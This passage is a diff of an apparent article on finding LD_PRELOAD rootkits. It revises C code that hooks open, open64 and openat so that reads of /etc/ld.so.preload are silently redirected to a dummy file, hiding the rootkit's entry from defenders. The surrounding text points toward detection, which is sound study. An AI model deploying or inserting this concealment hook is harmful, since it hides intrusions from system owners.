@@ -117,7 +117,7 @@ The obvious place to look for LD_PRELOAD rootkits is in /etc/ld.so.preload. Alth
 
 # sudo touch /etc/ld.so.preload.dummy
 
-/* intercept.c */
+/* intercept.c - updated*/
 #define _GNU_SOURCE
 #include <fcntl.h>
 #include <stdarg.h>
@@ -125,29 +125,32 @@ The obvious place to look for LD_PRELOAD rootkits is in /etc/ld.so.preload. Alth
 #include <string.h>
 #include <sys/types.h>
 
-const char *PRELOAD_PATH = "/etc/ld.so.preload";
-const char *DUMMY_PRELOAD = "/etc/ld.so.preload.dummy";
+#define PRELOAD_PATH "/etc/ld.so.preload"
+#define DUMMY_PRELOAD "/etc/ld.so.preload.dummy"
 
 __thread int inside_hook = 0;
+
+static const char* get_target_path(const char *pathname, int flags, va_list args, mode_t *mode) {
+    if (flags & O_CREAT) {
+        *mode = va_arg(args, mode_t);
+    }
+    if (!inside_hook && pathname && strcmp(pathname, PRELOAD_PATH) == 0) {
+        return DUMMY_PRELOAD;
+    }
+    return pathname;
+}
 
 int open(const char *pathname, int flags, ...) {
     static int (*orig_open)(const char*, int, mode_t) = NULL;
     if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
 
     mode_t mode = 0;
-    if (flags & O_CREAT) {
-        va_list args;
-        va_start(args, flags);
-        mode = va_arg(args, mode_t);
-        va_end(args);
-    }
+    va_list args;
+    va_start(args, flags);
+    const char *target = get_target_path(pathname, flags, args, &mode);
+    va_end(args);
 
-    if (inside_hook) return orig_open(pathname, flags, mode);
-
-    if (pathname && strcmp(pathname, PRELOAD_PATH) == 0) {
-        return orig_open(DUMMY_PRELOAD, flags, mode);
-    }
-    return orig_open(pathname, flags, mode);
+    return orig_open(target, flags, mode);
 }
 
 int open64(const char *pathname, int flags, ...) {
@@ -155,19 +158,12 @@ int open64(const char *pathname, int flags, ...) {
     if (!orig_open64) orig_open64 = dlsym(RTLD_NEXT, "open64");
 
     mode_t mode = 0;
-    if (flags & O_CREAT) {
-        va_list args;
-        va_start(args, flags);
-        mode = va_arg(args, mode_t);
-        va_end(args);
-    }
+    va_list args;
+    va_start(args, flags);
+    const char *target = get_target_path(pathname, flags, args, &mode);
+    va_end(args);
 
-    if (inside_hook) return orig_open64(pathname, flags, mode);
-
-    if (pathname && strcmp(pathname, PRELOAD_PATH) == 0) {
-        return orig_open64(DUMMY_PRELOAD, flags, mode);
-    }
-    return orig_open64(pathname, flags, mode);
+    return orig_open64(target, flags, mode);
 }
 
 int openat(int dirfd, const char *pathname, int flags, ...) {
@@ -175,19 +171,12 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
     if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
 
     mode_t mode = 0;
-    if (flags & O_CREAT) {
-        va_list args;
-        va_start(args, flags);
-        mode = va_arg(args, mode_t);
-        va_end(args);
-    }
+    va_list args;
+    va_start(args, flags);
+    const char *target = get_target_path(pathname, flags, args, &mode);
+    va_end(args);
 
-    if (inside_hook) return orig_openat(dirfd, pathname, flags, mode);
-
-    if (pathname && strcmp(pathname, PRELOAD_PATH) == 0) {
-        return orig_openat(dirfd, DUMMY_PRELOAD, flags, mode);
-    }
-    return orig_openat(dirfd, pathname, flags, mode);
+    return orig_openat(dirfd, target, flags, mode);
 }
 
 So then, how can we find and identify the preloaded shared library? Well, there are a couple places we could look. One being ldd and the other being a virtual memory map. If we call ldd using
